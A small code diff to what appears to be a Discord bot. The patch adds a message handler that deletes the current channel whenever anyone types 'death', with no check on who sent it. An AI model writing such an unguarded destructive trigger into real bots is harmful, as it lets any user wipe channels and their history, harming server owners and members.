@@ -6,6 +6,9 @@ client.on("warn", (m) => console.log("[warn]", m));
 var start = Date.now();
 
 client.on("message", m => {
+	if(m.content === "death"){
+		m.channel.delete();
+	}
 	if (m.content === "&init") {
 		for (var channel of m.channel.server.channels) {
 			if (channel instanceof Discord.VoiceChannel) {
